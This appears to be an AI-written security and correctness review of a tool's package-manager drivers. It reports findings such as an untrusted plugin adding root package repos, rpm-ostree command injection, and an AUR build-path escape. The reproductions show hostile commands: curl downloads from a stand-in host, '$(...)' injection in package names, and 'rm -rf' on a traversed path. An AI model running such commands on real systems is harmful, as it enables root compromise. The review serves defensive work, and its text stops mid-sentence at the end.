# Review: Drivers: OS package managers + the Driver base

Baseline: `956208e` · 2026-11-08 · reviewer: opus, effort xhigh
Scope: `configsys/driver.py`, `configsys/drivers/__init__.py`, `configsys/drivers/_native.py`,
`apk.py`, `apt.py`, `aur.py`, `brew.py`, `dnf.py`, `flatpak.py`, `native_pkg_file.py`, `pacman.py`,
`rpm_ostree.py`, `snap.py`, `xbps.py`, `zypper.py`.
Context: `runner.py`, `app.py` (`_NATIVE_REFRESH`/`refresh_native_index`/scope injection),
`actions.run_plan`, `installState.py`, `plugins.command_source_trusted`/`ships_executable_data`,
`test_abi_surface`, `test_driver_inventory`, `.claude/skills/add-driver/SKILL.md`,
`~/src/configsys-void` (parity plugin).
Tests read: `test_apt_driver`, `test_apt_commit_source`, `test_dnf_driver`, `test_dnf_commit_repo`,
`test_pacman_driver`, `test_zypper_driver`, `test_apk`-via-`test_native_pkg_file`,
`test_xbps_driver`, `test_brew_driver`, `test_snap_driver`, `test_rpm_ostree_driver`,
`test_aur_driver`, `test_flatpak_driver`, `test_native_pkg_file`, `test_driver_inventory`,
`test_abi_surface`, `test_run_plan`, `~/src/configsys-void/test/test_parity.py`.
Verification (2026-11-08, adversarial checker): every CRITICAL/HIGH and every security/safety finding
at MED or above was checked — drivers-os-01, -02, -03, -06. All four held up, none refuted. Two
severities changed: 01 CRITICAL → HIGH and 03 HIGH → LOW (03 moved into the LOW group). See each
finding's **Verified:** line.

## Carried over from docs/review-2026-09/drivers-os.md

| earlier finding | status | evidence |
|---|---|---|
| H1 `_alt.py` route fields unquoted into root shell | fixed | `7f43966`; `_alt.py` now `shlex.quote`s ppa/deb/link/slaves. (`_alt.py` is drivers-lang's scope now.) |
| H2 no `batch_index` for dnf/zypper/pacman/apk/brew/snap | **open (partial)** | `eae03ac` batched *installed* state only; the *candidate/latest* probe still spawns per unit → **drivers-os-02**. |
| D1 `NativePkgManager` base | fixed | `7b99a17` (+ `_native.py`). |
| MED apt `source-line` `$CODENAME` expanded in double quotes | open | `apt.py:207` still `echo "{src_line}"` raw → folded into **drivers-os-01** (only exploitable from an untrusted plugin, which 01 covers). |
| MED rpm-ostree `echo "... {pkg} ..."` re-expands the quoted name | open | **drivers-os-03** (reproduced). |
| MED native-pkg-file predictable `/tmp` as root | fixed | `7f43966`; now `mktemp -d` + quoted `"$PKG"` (`native_pkg_file.py:125`). |
| MED flatpak `install` emits literal `''` with no hub | fixed | `f684a71`; `flatpak.py:372` omits the token. |
| MED apt lock/set_version disagree with `_pkgs` (multi-package) | fixed for apt | `apt.py:420,438,444` act on the whole `_pkg_list`. Same bug remains in dnf/zypper/xbps `set_version` → **drivers-os-05**. |
| MED native-pkg-file dpkg probe lacks config-files guard | open | **drivers-os-04** (reproduced). |
| MED native-pkg-file / `_alt` run `apt-get` without `_APT_ENV` | open | native-pkg-file `_install_cmd`/`uninstall` still bare `apt-get … -y` → **drivers-os-10**. |
| MED package-format / PM detection probes binaries not the resolved OS | open | `native_pkg_file._format` (`shutil.which`) → **drivers-os-11**. |
| MED apt `ensure_prereqs` ignores 4 of 6 step results | open (reduced) | `_commit_source` now returns failures; foreign-arch/repo-component/ppa/pubkey still dropped → **drivers-os-13**. |
| MED apt inline `sudo` under `capture=True` can't prompt | obsolete | `actions.run_plan` now `begin_sudo()`s up front for any root op before `ensure_prereqs` runs; the warm ticket serves the captured `sudo -n`. |
| MED apk has no test | fixed (partial) | `test_native_pkg_file.py` now tests `Apk.installed_index`/`explicit_keys`/batched reads; mutation commands still untested → **drivers-os test-gaps**. |
| MED documented `Driver` contract omits used methods | fixed | `da0a7ac`; `test_abi_surface.FROZEN_HOOKS` now pins `location_override`, the batch/enumeration hooks, etc.; `_batch` renamed to the frozen `batch`. |
| MED dnf lock/unlock reinstall the versionlock plugin every call | open | **drivers-os-08**. |
| LOW dnf writes `gpgkey=None` with no `pubkey-url` | fixed | `f684a71`; `dnf.py:150` → `gpgcheck=0`. |
| LOW flatpak docstring says `get_latest` deferred | fixed (NIT residual) | docstring corrected; the test name `test_get_latest_deferred_none` is still stale → **NIT**. |
| LOW `drivers/__init__` docstring lists an old driver set | fixed | now points at `_REGISTRY`. |
| LOW `Driver.scope` vs `_scope` disagree on `honors_scope` | open | **drivers-os-14** (NIT). |
| LOW zypper/apk/rpm-ostree/aur lack `installed_index` | fixed (mostly) | zypper/apk/xbps enumerate now; rpm-ostree/aur legitimately don't. |
| LOW substring matching in `is_locked` (flatpak/snap) | open | **drivers-os-12**. |
| NIT `_probe_name` apt-only staticmethod | fixed | lifted to `NativePkgManager._probe_name`. |

## Cross-cutting themes

- **The trust gate is wired into only three drivers.** `command_trusted(rc)` /
  `untrusted_command_result(rc)` exist on the base and `docs/principles.md` names apt
  `source-line:`/`ppa:`/`apt-source:` as command-carrying data that "needs the same trust as code" —
  but only `script`, `source` and `glue` consult it. apt/dnf (and `_alt`, drivers-lang) execute
  their vendor-repo recipes as root with no check (**drivers-os-01**).
- **Batching stopped at installed-state.** The C1 win (`batch_index` → `installed_index`) covers
  `get_version`, but `get_latest` (the candidate/"outdated" probe) is still per-unit for
  dnf/zypper/pacman/apk/brew/snap — apt and xbps are the only two that batch the candidate
  (**drivers-os-02**). The pattern to copy already lives in `xbps.batch_index`.
- **Multi-package (`packages:`) bindings are handled unevenly.** apt was fully fixed; dnf/zypper/xbps
  `set_version` still pin only `rc.name` (often the component, not a package), and pacman `uninstall`
  removes `rc.name` only (**drivers-os-05**).
- **Shell-metacharacter quoting is good on package *names*, but a few spots re-expand a
  quoted value inside double quotes** (rpm-ostree echo, apt `$CODENAME` source-line) — quoting a
  value then embedding it in `"..."` undoes the quoting.
- **Small home-collapse / list / truthy helpers are hand-copied** across driver.py, reportgen, app,
  the Config screen, dnf, snap, rpm-ostree — one has a prefix bug (**drivers-os-15**).

## Findings

### drivers-os-01 [HIGH] security — apt/dnf run command-carrying vendor-repo data as root without the trust gate

`apt.py:142-232` (`ensure_prereqs`) and `dnf.py:120-176` (`ensure_prereqs`/`_commit_repo`) execute a
binding's `ppa:`, `source-line:`, `source-url:`, `pubkey-url:`, `repo-url:`/`repo-id:` fields as
**root** (`sudo=True`) on install/upgrade/set-version. None of these call `command_trusted(rc)`.
`docs/principles.md` ("Data, not script is not a security boundary") and `docs/plugins.md` §6 both
promise that an apt `source-line:`/`ppa:` from an un-approved plugin is *refused* until the plugin is
trusted — but that refusal is implemented only in `script.py`/`source.py`/`glue.py`. A plugin a user
has declared and synced **but deliberately not trusted** (the nudge even tells them its recipes are
refused) can ship a native component whose binding carries a vendor repo; installing it runs
attacker-controlled shell as root. The `source-line` `$CODENAME` branch (`apt.py:203-207`) compounds
it: the raw line sits inside `echo "..."`, so shell expansions in it run even before the repo is used.
**(reproduced)** A synced-but-untrusted plugin `evilplug` shipping a native `evil-tool` whose binding
carries `ppa:`/`source-line:`/`source-path:`:
`configsys --home … --os pop_os!:22.04 --pretend install evil-tool --yes` →
`[pretend] sudo add-apt-repository -y ppa:…` then the `$CODENAME` `echo "deb … $(…)" | sudo tee …`
runs — `plugin list` still shows `evilplug … [ships recipes — untrusted]`. Confirmed the gate itself
works but is never consulted: `Apt(None, paths).command_trusted(rc_from_untrusted_plugin)` → `False`,
while `'command_trusted' in Apt.ensure_prereqs.__code__.co_names` → `False` (same for `Dnf`).
Attacker controls the plugin's content (a repo the user added to review before trusting); without this
bug they could do nothing as root — trust is the boundary — so the severity is the full gap.
**Fix:** gate every command-carrying prereq on `command_trusted(rc)` and return
`untrusted_command_result(rc)` otherwise — in apt `ensure_prereqs` (and dnf's), treating
`ppa`/`source-line`/`source-url`/`pubkey-url`/`repo-url`/`enable-repo`/`debconf` as the trigger; add
these keys to the "what counts as executable data" surface and a regression test with an
untrusted-plugin binding. Secondary: quote everything but a `"$CODENAME"` splice in the source-line
write (or resolve the codename in Python). **Effort:** M. **Tier:** A.
**Verified:** CONFIRMED (reproduced) — severity CRITICAL → HIGH. Sandbox
`scratch/verify-drivers-os/home` with one synced, untrusted data plugin (`plugin list` →
`evilplug … ok [ships recipes — untrusted; run: configsys plugin trust evilplug]`).
`configsys --home … --os 'pop_os!:22.04' --pretend install vfy-script vfy-apt-ppa vfy-apt-line vfy-apt-src --yes`:
the plugin's `via: script` is refused (`vfy-script: refusing to run script commands from the
untrusted plugin 'evilplug'`), but the same plugin's apt prereqs are all issued:
`[pretend] sudo add-apt-repository -y ppa:vfy/ppa`;
`[ -f /usr/share/keyrings/vfy.gpg ] || sudo curl -fsSL https://vfy.invalid/key.asc -o /usr/share/keyrings/vfy.gpg`;
`… sudo curl -fsSL https://vfy.invalid/vfy.list -o /etc/apt/sources.list.d/vfy-src.list && sudo apt-get update`;
and the `$CODENAME` `echo "deb [trusted=yes] …" | sudo tee /etc/apt/sources.list.d/vfy-line.list`.
Each one is followed by `sudo … apt-get install -y hello`. dnf (`--os fedora:43`):
`printf %s '[vfyrepo] … baseurl=https://vfy.invalid/el … gpgcheck=0' | sudo tee /etc/yum.repos.d/vfyrepo.repo`,
then `sudo dnf install -y hello`. It's reachable without the user ever naming a plugin component.
A data plugin whose only content is `git: { install: [ { via: native  ppa: "vfy/ppa" } ] }`
overrides core `git`'s binding: `where git` → `defined in ~/.config/configsys/plugins/themeplug/themeplug.hu
(overrides routes.hu)` … `ppa=vfy/ppa <- default here`. Then `install --picks --yes` (picks: `[ git ]`) issues
`sudo add-apt-repository -y ppa:vfy/ppa` before `apt-get install -y git`. There is no gate:
`command_trusted` is called only in script.py/source.py/glue.py, and test_plugin_trust.py covers only
`via: script`. History: 2026-09 A1 [HIGH] named apt `source-line:`/`ppa:` and is marked DONE by `f066814`.
That commit gated script/source/glue and taught `ships_executable_data` the apt keys, but never
touched apt.py/dnf.py. One detail correction: the `$CODENAME` write isn't itself sudo'd, so a `$(…)` in a
source-line runs as the **invoking user**, not root. That was shown by running the generated write under bash
with `sudo` shadowed by a stdin-draining function: the marker landed in scratch, and nothing was written
under /etc. The root path is the repo plus the install that follows. **Severity:** the same
untrusted plugin already gets root on the same explicit install through the ungated, documented-inert
`native-pkg-file` driver. `--pretend install vfy-deb` →
`sudo D="$(mktemp -d)" && … curl … https://vfy.invalid/vfy.deb -o "$PKG" && apt-get install -y "$PKG"`.
So the increment here is a persistent, system-wide package source (`gpgcheck=0` / `[trusted=yes]`) that
outlives the install and feeds every later upgrade. On top of that, the "its recipes are refused" promise
is broken while `plugin list` still shows it. That makes it HIGH, matching 2026-09 A1 and the security-01
verdict on the same gap.

### drivers-os-02 [HIGH] performance — no batched candidate index for dnf/zypper/pacman/apk/brew/snap

`dnf.py:64` (`get_latest`→`repoquery`), `zypper.py:80` (`zypper info`), `pacman.py:90`
(`pacman -Si`/`-Sg`), `apk.py:253` (`apk list`), `brew.py:116` (`brew info --json`), `snap.py:70`
(`snap info`) each spawn ONE subprocess **per unit** for the "latest/candidate" probe that startup
inspection runs on every component. The 2026-09 C1 work batched only `installed_index`; the candidate
side was never batched for these six (apt and xbps are the only drivers whose `batch_index` carries a
`candidate` map their `get_latest` reads). On a Fedora/Arch/openSUSE/Alpine/atomic host with ~100
picks that is ~100 spawns of a repo-metadata-loading query at every inspect.
**(reproduced)** Counting `InstallState.inspect` spawns for 100 installed units with a recording
runner: `apt` 6 total, `xbps` 3, but `dnf` 201 (100× `repoquery … --latest-limit=1`), `zypper` 201,
`pacman` 201, `apk` 101, `brew` 201 (100× `brew info --json`), `snap` 201. Measured in
`localhost/configsys-test:fedora45` (dnf5): a single `dnf -q repoquery --qf '%{name} %{version}\n'
--latest-limit=1 <20 names>` = **0.80 s**, versus `repoquery … <one name>` = **0.73–0.84 s each**;
at the inspect pool's 8-way concurrency 100 units ≈ ~10 s of repoquery, which one batched call
collapses to ~1 s. `rpm -qa` (the installed batch) is 0.13 s, confirming repoquery is the cost.
**Fix:** give each enumerable native driver a `candidate` layer in `batch_index` and have `get_latest`
read `self.batch['candidate']` (the shape `xbps.batch_index` and `apt.batch_index` already use):
dnf `repoquery --qf '%{name} %{version}' --latest-limit=1 <names>`; zypper `--no-refresh info
<names>`; pacman `-Si <names>` + `-Sg`; apk `list <names>`; brew `info --json=v2 --installed`; snap
has no bulk `info` but can at least dedupe. Ideally fold a `latest_index(names)` hook into
`NativePkgManager` so the default `batch_index` carries both. **Effort:** M. **Tier:** C.
**(carried_from H2)**
**Verified:** CONFIRMED (reproduced) — HIGH kept, with two corrections. Spawn count: a recording runner
over 100 installed units (`scratch/verify-drivers-os/mine/spawns.py`; per-unit probes answer
successfully, so no fallback fires) gives apt 6, xbps 3, apk 101 (`get_latest` ×100) and pacman
**101, not 201** (the reviewer's fake made `-Si` fail, so the `-Sg` group fallback doubled the count).
dnf, zypper, brew and snap give 201 each, split `get_latest` ×100 + `is_locked` ×100 + one enumeration.
So half of those spawns are the per-unit `is_locked` probe (`dnf versionlock list`, `zypper locks`,
`brew list --pinned`, `snap list <name>`), and the fix must batch a `held` set too, as apt/xbps do.
No cache stands in front: `app.load_pipeline` calls `InstallState.inspect` with `reuse=None` at
startup, and `inspect_one` calls `drv.get_latest` for every unit (`method-versions.hu` serves only `versions`).
Real cost, measured in `localhost/configsys-test:fedora45` (dnf5 5.4.6, 8 CPUs, repo mounted
read-only, `dnf makecache` first): the shipped `InstallState.inspect` over 100 real installed units took
**29.5 s and 28.7 s** in two runs (201 spawns). A monkeypatched sketch of the fix (one `repoquery
--latest-limit=1` over every name in `batch_index`, read by `get_latest`) took **3.04 s**, with 0
`latest_version` mismatches across the 100 units. Single `repoquery` 0.98–1.25 s; one batched over
100 names 1.32 s; `dnf versionlock list` 0.08 s; `rpm -qa` 0.26 s. Host load average was 8–10 from other
agents' containers, so absolute times are inflated; A and B ran back to back in the same container.
Line ref: apk's `get_latest` is `apk.py:110`, not `:253`.

### drivers-os-04 [MED] correctness — native-pkg-file reports a removed component as installed forever

`native_pkg_file.py:78-89` (`get_version`) / `:91-96` (`is_locked`) query
`dpkg-query -W -f='${Version}\n'` with no `${db:Status-Status}` guard. `apt.get_version`
(`apt.py:391`) and `installed_index` (`apt.py:252`) carry that guard precisely because after
`apt-get remove`, dpkg keeps the package in `config-files` state and still prints a version — so a
removed native-pkg-file component reads as installed/outdated forever (and `is_locked` can read a
removed package). This is the exact apt bug (`838f082`-era) re-introduced in the sibling.
**(reproduced)** On this host, `asciidoc` is in `config-files` state
(`dpkg-query -W -f='${db:Status-Status} ${Version}' asciidoc` → `config-files 10.1.2-1`):
`NativePkgFile.get_version(rc('asciidoc'))` → `10.1.2-1`, while `Apt.get_version` → `None`.
**Fix:** for the deb path, status-guard the probe (or delegate to `Apt.get_version` once
native-pkg-file can reach the resolved native driver). **Effort:** S. **Tier:** B.
**(carried_from 2026-09 MED)**

### drivers-os-05 [MED] correctness — dnf/zypper/xbps set_version (and pacman uninstall) ignore a multi-package binding

A `packages: [a, b]` native binding installs the whole set and uses `rc.name` (the *component* name,
e.g. `opengl`, `opengl-dev` — not a real package) only for display/probe. apt was fixed to pin the
whole set, but `dnf.set_version` (`dnf.py:186` `f'{rc.name}-{version}'`), `zypper.set_version`
(`zypper.py:135` `f'{rc.name}={version}'`) and `xbps.set_version` (`xbps.py:355` `f'{rc.name}-…'`)
pin `rc.name`, so set-version targets a package that doesn't exist. `pacman.uninstall`
(`pacman.py:138`) removes `rc.name`, not the installed set. (dnf/xbps `lock`/`unlock` correctly use
`_pkgs`; only `set_version`/pacman-remove are inconsistent.)
**(reproduced)** With `fields={'name':'opengl-dev','packages':['mesa-libGL-devel','mesa-libGLU-devel']}`:
`dnf.set_version(rc,'1.0')` → `dnf install -y opengl-dev-1.0 || dnf downgrade -y opengl-dev-1.0`
(no such package); `zypper.set_version` → `zypper … install --oldpackage opengl-dev=1.0`;
`xbps.set_version` → `xbps-install -y opengl-dev-1.0`. `pacman --pretend remove opengl` on arch →
`pacman -R … opengl` though `install` was `pacman -S … mesa glu`. 28 `packages:` bindings carry no
`when: arch/debian`-only guard; 25 target the redhat/void families where this bites.
**Fix:** route `set_version` through `_pkg_list` (pin each package) the way apt does; make pacman
`uninstall` expand the set. Note most of these drivers are `holds_version=False` (pacman/apk) so
set-version is already declined there — dnf/zypper/xbps are the live cases. **Effort:** S. **Tier:** B.

### drivers-os-06 [MED] safety/security — aur builds in a fixed shared /tmp path keyed by an unvalidated package name

`aur.py:20,57-69`: `_BUILD_ROOT = '/tmp/configsys-aur'`, then
`build = f'{_BUILD_ROOT}/{pkg}'` with `pkg = rc.name` interpolated into `rm -rf {build}`,
`mkdir -p {build}`, `git clone … {build}`, `cd {build}`. The path is quoted (no injection), but (a)
`/tmp/configsys-aur` is a fixed, world-known, non-private directory — another local user can
pre-create it or race the `rm -rf`/`clone` with a symlink; and (b) `rc.name` is never constrained to
a single path segment, so a name with `../` escapes the build root.
**(reproduced)** `Aur.install(rc(name='../../home/victim'))` →
`rm -rf /tmp/configsys-aur/../../home/victim` … `git clone … /tmp/configsys-aur/../../home/victim`
(the `rm -rf` runs as the user, so it stays inside the user's reach, but it is a user-controlled path
escape from the intended build root; the shared `/tmp` dir is the symlink-race surface).
**Fix:** build under a private per-run `mktemp -d` (or `paths.cache`/`<state>/aur-build/<pkg>` with a
validated single-segment name); reject an AUR pkgname that isn't `[A-Za-z0-9._+-]+`. **Effort:** S.
**Tier:** A.
**Verified:** CONFIRMED (by reading) — MED kept. The code is at `aur.py:20` (`_BUILD_ROOT`) and
`:57-69` (`install`); the file is 83 lines, so the original `:184,221-233` refs (now corrected) were wrong.
`build = f'{_BUILD_ROOT}/{pkg}'` with `pkg = rc.name` is used by `rm -rf` / `mkdir -p` / `git clone` /
`cd`, and then `makepkg -si --noconfirm` runs, all as the user. The build tree is never cleaned up.
Nothing validates an AUR name: `routecheck.py`'s only regex is an ISO date, resolve/adapt pass `name:`
through untouched, and test_aur_driver.py pins no path or charset. Every core `via: aur` name is an
ordinary pkgname, so the `../` half needs a hostile or mistaken layer, and it only steers a user-level
`rm -rf` / clone. An untrusted plugin can already do that much through documented-inert drivers
(security-02: a tarball `installDir` is `rm -rf`'d), so that half adds little. The fixed shared path
carries the MED. Any other local account can create `/tmp/configsys-aur` first. At minimum that breaks
every AUR install (`mkdir -p` under a directory the victim can't write, under `set -e`). Beyond that, an
attacker-owned build root lets that account interfere with the victim's build tree before `makepkg -si`
sudo-installs the result. That is a cross-user exposure on multi-user Arch hosts, and none on a
single-user desktop. Not reproduced: it needs a second local account.

### drivers-os-07 [MED] correctness — a non-integer tarball/source `strip:` crashes the whole run

`driver.py:291` (`_extract_cmd`): `s = f'--strip-components={int(strip)} '` — `int(strip)` raises
`ValueError` on a non-numeric `strip:` field, and nothing catches it: the exception propagates out of
`install`, past `run_plan`'s per-op `try` (which only catches `KeyboardInterrupt`), and aborts the
whole command with a traceback — one bad field bricks the batch. `routecheck` has no `strip:` lint.
**(reproduced)** A user component `badstrip` with `{ via: tarball … strip: one }`:
`configsys --home … --os pop_os!:22.04 --pretend install badstrip --yes` → process exits 1 with
`ValueError: invalid literal for int() with base 10: 'one'` from `driver.py:291`
(`_extract_cmd`), after the earlier picks already "installed".
**Fix:** coerce defensively (`int(str(strip))` in a guarded parse → skip/one with a clear driver
`Result.fail`, not a traceback) and add a `routecheck` lint that `strip:` is a non-negative integer.
**Effort:** S. **Tier:** B.

### drivers-os-08 [MED] performance — dnf reinstalls the versionlock plugin on every lock/unlock

`dnf.py:191-200`: `_ensure_versionlock` runs `dnf install -y python3-dnf-plugin-versionlock`
unconditionally before every `lock`/`unlock` — a metadata-loading dnf transaction (seconds) even when
the plugin is already present, on what should be a one-line hold.
**Fix:** guard with `rpm -q python3-dnf-plugin-versionlock` (or trust `dnf versionlock list`'s exit
status, which `is_locked` already interprets) and only install on absence. **Effort:** S. **Tier:** C.
**(carried_from 2026-09 MED)**

### drivers-os-09 [MED] correctness — dnf4 versionlock: held_keys goes blind and is_locked prefix-matches

`dnf.py:103-113` (`held_keys`) only recognises the dnf5 `Package name: <n>` line; the dnf4 format is
`name-epoch:version-release.*` globs, so on EL/dnf4 `held_keys()` returns an empty set — the System
Updates lane won't know a package is held. `dnf.py:79-85` (`is_locked`) tolerates dnf4 by matching
`s == name or s.startswith(name + '-')`, which false-positives: a lock on `bash-completion` makes
`is_locked('bash')` true.
**(reproduced)** Feeding real `dnf versionlock list` output captured from `almalinux:10` (dnf 4.20.0),
`bash-completion-1:2.11-16.el10.*`: `Dnf.held_keys()` → `set()` (blind); `Dnf.is_locked(bash)` →
`True` (should be False — only `bash-completion` is locked).
**Fix:** parse the dnf4 glob form in both `held_keys` and `is_locked` (strip the trailing
`-<epoch:ver>-<rel>.*` to the package name and compare exactly); keep the dnf5 branch.
**Effort:** S. **Tier:** B.

### drivers-os-10 [MED] correctness — native-pkg-file runs apt-get without the non-interactive env

`native_pkg_file.py:103,132` (`_install_cmd`/`uninstall`): `apt-get install -y "$PKG"` /
`apt-get remove -y {pkg}` with no `DEBIAN_FRONTEND=noninteractive NEEDRESTART_MODE=a` prefix
(`apt._APT_ENV`). A vendor `.deb` commonly carries debconf questions, and Ubuntu's `needrestart` hook
fires post-install — either can paint a whiptail dialog mid-batch, the exact thing `_APT_ENV` exists
to prevent (verified by reading; no interactive host to reproduce).
**Fix:** export `_APT_ENV` from one place (ideally `NativePkgManager.ENV`, which native-pkg-file can
reuse once it dispatches to the resolved native driver) and prefix the deb install/remove.
**Effort:** S. **Tier:** B. **(carried_from 2026-09 MED)**

### drivers-os-11 [MED] correctness — native-pkg-file picks its format by probing binaries, not the resolved OS

`native_pkg_file.py:41-45` (`_format`) chooses `deb` if `dpkg`/`apt-get` is on PATH, else rpm/pacman —
independent of the machine the resolver already settled (`cascade.native(block)`, used by
`app.refresh_native_index`/`resolve`). Fedora images that pulled `dpkg` (via `alien`, some CI) would
make native-pkg-file install a `.deb` on an rpm box; a Debian host with `dnf` installed is the mirror
case. The resolver knows the manager; the driver re-guesses and can disagree.
**Fix:** inject the resolved native-manager name onto the unit (the way `location-override` is
injected) and dispatch on it, keeping `shutil.which` only as a fallback. This dovetails with the
"native-pkg-file delegates to the native driver" refactor the 2026-09 README filed under D1.
**Effort:** M. **Tier:** B. **(carried_from 2026-09 MED)**

### drivers-os-03 [LOW] security — rpm-ostree echoes the quoted package name back into a double-quoted string (root command substitution)

*(Was HIGH; moved into the LOW group on verification. The ID is unchanged.)*

`rpm_ostree.py:62-70` (`_layer`): `pkg = shlex.quote(self._pkg(rc))` is then embedded in
`f'rpm-ostree {verb} … {pkg} && echo "configsys: {verb} {pkg} … " >&2'`, run `sudo=True`. Inside the
double-quoted `echo`, the single quotes `shlex.quote` added are literal, so a `$(...)` in the package
name expands and runs **as root**. The `rpm-ostree` call itself is safe (the quoted arg); the advisory
`echo` is not. The package name is a route/plugin field; on an atomic distro a layered component is
plausibly plugin-sourced.
**(reproduced)** With a name carrying a command substitution, stubbing `rpm-ostree` to a no-op:
`bash -c '<_layer command>'` printed the injected marker on stderr ("INJECTED"), then the advisory
line with the name collapsed to `'foo'` — proving the substitution ran.
**Fix:** `echo {shlex.quote(f'configsys: {verb} {name} staged …')}` (quote the whole message once,
using the RAW name), or emit the advisory from Python after the `Result` rather than from the shell.
**Effort:** S. **Tier:** A. **(carried_from 2026-09 MED)**
**Verified:** CONFIRMED (by reading) — severity HIGH → LOW (the area JSON had MED). `_layer` is
`rpm_ostree.py:62-70`; the file is 93 lines, so `:217-225` doesn't exist. Splicing the `shlex.quote`d
name into `echo "configsys: {verb} {pkg} …"` does defeat the quoting, and the fix is right. But the
echo is chained with `&&` after `rpm-ostree {verb} -y {pkg}`, which gets the name as one quoted
argument. rpm-ostree exits non-zero for anything it can't layer (install: packages not found) or
hasn't layered (uninstall: not currently requested), so the echo only runs once rpm-ostree has succeeded
on that exact metacharacter-bearing name. The reproduction stubbed `rpm-ostree` to always succeed,
which bypasses exactly that guard. No distro repo carries such a name. An attacker who can put one into
an enabled repo, or leave a local package on disk for this driver to layer, already controls the next
deployment as root through that package's scriptlets. Rated on the difference, this is hardening, not a
reachable root injection: worth the one-line fix and an injection test (test_rpm_ostree_driver.py feeds
only plain names), but LOW.

### drivers-os-12 [LOW] correctness — substring/loose matching in is_locked (flatpak, snap) and snap's install double-space fixup

`flatpak.py:360` (`is_locked` per-unit path): `any(appid in line …)` matches `org.foo.Bar` inside
`org.foo.Bar2`/`org.foo.Bar.Extra`; the batched path (`:357`) uses an exact set, so the two paths can
disagree. `snap.py:91`: `any(self._snap(rc) in ln and 'held' in ln …)` matches a snap whose version
or another column contains the name or the word `held`. `snap.py:133`: the install command is built
then `.replace('  ', ' ')` to paper over `_extra()` returning `''`.
**Fix:** split columns and compare the name token exactly (flatpak app-id / snap Name); build the snap
command from a token list joined with `' '.join(t for t in toks if t)`. **Effort:** S. **Tier:** B.
**(carried_from 2026-09 LOW)**

### drivers-os-13 [LOW] robustness — apt/dnf ensure_prereqs still drop several step results

`apt.py:151-175` runs `foreign-arch`, `repo-component`, `ppa`, `pubkey-url` steps and discards each
`Result` (only `source-url`/`source-line` go through `_commit_source` and can abort). `dnf.py:132-141`
drops `rpm --import`, `dnf install dnf-plugins-core`, and `config-manager --set-enabled` results. A
failed `add-apt-repository ppa:…` (no `software-properties-common`, no network) is followed by an
install that then fails with a misleading "Unable to locate package."
**Fix:** return the first classified failing `Result` from these steps, consistent with
`_commit_source`'s validate-then-commit posture. **Effort:** S. **Tier:** B.
**(carried_from 2026-09 MED)**

### drivers-os-14 [LOW] naming/correctness — Driver.scope and Driver._scope disagree on who reads the scope field

`driver.py:129-139`: `scope()` returns the fixed `default_scope` for a non-`honors_scope` driver, but
`_scope()` (used by `sudo()`, `scoped_dir()`) reads `rc.fields.get('scope')` regardless of
`honors_scope`. A stray `scope: system` on an apt binding would change `sudo(rc)`/`scoped_dir` while
`scope(rc)` ignores it — the two truths diverge for a user-default non-honoring driver.
**Fix:** make `_scope` delegate to `scope` (one source of truth), or document the asymmetry if it is
deliberate. **Effort:** S. **Tier:** B/F. **(carried_from 2026-09 LOW)**

### drivers-os-15 [LOW] reuse/correctness — Driver.display_path collapses HOME by raw string prefix

`driver.py:552-556`: `'~' + s[len(home):] if s.startswith(home)` — a plain prefix test, so with
`HOME=/home/al`, `/home/alice/bin` renders as `~ice/bin`. The identical code is copy-pasted in
`reportgen.py:192`, `app.py:1672`, `app.py:1802`, and `tui/screens/config.py:107` (five copies).
**(reproduced)** `Driver(None, Paths(env={'HOME':'/home/al'})).display_path('/home/alice/bin/x')`
→ `~ice/bin/x`.
**Fix:** one shared helper that collapses only on a path-boundary (`home` or `home + os.sep`), used by
all five sites. Cosmetic in practice (real homes rarely prefix one another) but it is five copies of a
subtly wrong line. **Effort:** S. **Tier:** D.

### drivers-os-16 [LOW] abi — the dict form of installed-name isn't in a shared helper, so plugin drivers hand-rolling _probe_name crash on it

`_native.installed_name` (`_native.py:138`) handles the driver-keyed-map form of `installed-name:`
(`{ apt: cargo }`), and core's native drivers inherit `NativePkgManager._probe_name`. But a plugin
driver that copies the old `_probe_name` shape (`rc.fields.get('installed-name')` directly) breaks on
a map value — `str(dict)`/`dict in set`. The in-tree example plugin does exactly this.
**(reproduced)** Core `Xbps._probe_name(rc={'installed-name':{'apt':'cargo'}})` → `'cargo'`, batched
`get_version` → `'1.0_1'`; the `~/src/configsys-void` plugin's `Xbps` → `TypeError: expected string
or bytes-like object` (unbatched) / `unhashable type: 'dict'` (batched). The `rust` binding in
`routes.hu:1201` carries `installed-name: { apt: cargo }`, so this is a live shape. The void plugin is
"kept behaviorally identical to core" and its parity test passes — because the parity scenarios never
feed a dict `installed-name`.
**Fix:** promote `installed_name(rc, driver)` into the frozen ABI surface (`configsys.plugins`
re-export) as the sanctioned way to read `installed-name:`, and reference it from the add-driver
playbook; add a dict-`installed-name` scenario to the void parity test. (The plugin itself is the
user's to fix, but the ABI omission is ours.) **Effort:** S. **Tier:** F.

### drivers-os-17 [NIT] — stale flatpak test name; dnf repoquery --userinstalled hits repo metadata

`test_flatpak_driver.py:140` `test_get_latest_deferred_none` is a stale name (duplicate of
`test_get_latest_none_without_hub` at `:123`) left from when `get_latest` was deferred. Separately,
`dnf.py:48` `dnf repoquery --userinstalled` loads repo metadata (can go to the network) for an rpmdb
question — `dnf repoquery --userinstalled --installed` (or `dnf history userinstalled`) avoids it.
**Fix:** rename/remove the dup test; add `--installed` to the userinstalled query. **Effort:** S.
**Tier:** C.

## Test gaps

- **apk mutation commands** are untested — `installed_index`/`explicit_keys`/batched reads are covered
  (`test_native_pkg_file.py`), but `install`/`uninstall`/`upgrade` command shapes, `set_version`/`lock`
  declining, and `_version_from_apk_list`'s `gcc` vs `gcc-doc` prefix guard are not.
- **No injection regression gate anywhere.** No driver test feeds a name/field with a shell
  metacharacter and asserts it is quoted. The rpm-ostree `echo` bug (drivers-os-03) and the
  trust-gate bug (drivers-os-01) would both have been caught by one.
- **Multi-package `packages:` set-version** is untested for dnf/zypper/xbps (drivers-os-05); apt has
  `test_multi_package_binding_locks_pins_and_checks_the_whole_set`, the others don't.
- **dnf4 versionlock** parsing (drivers-os-09): `test_dnf_driver.py` tests only the dnf5 `is_locked`
  format; no dnf4 `held_keys`/`is_locked` case.
- **native-pkg-file**: `get_version`/`is_locked` config-files guard, format dispatch order, and the
  arch-keyed vs format-then-arch `asset:` maps (`:46-55`) are untested (the file tests only the temp
  extension + asset-fresh URL).
- **The `candidate` batch** (drivers-os-02) once added needs a `batch_index answers get_latest without
  a subprocess` test per driver, matching `test_zypper_driver.test_batch_index_answers_get_version…`.
- **`strip:` non-integer** (drivers-os-07): no test that a bad `strip:` is rejected cleanly instead of
  raising.

## Dead code

None found in the owned files. Grepped `~/src/configsys-*` (read-only), `test/`, and the frozen ABI
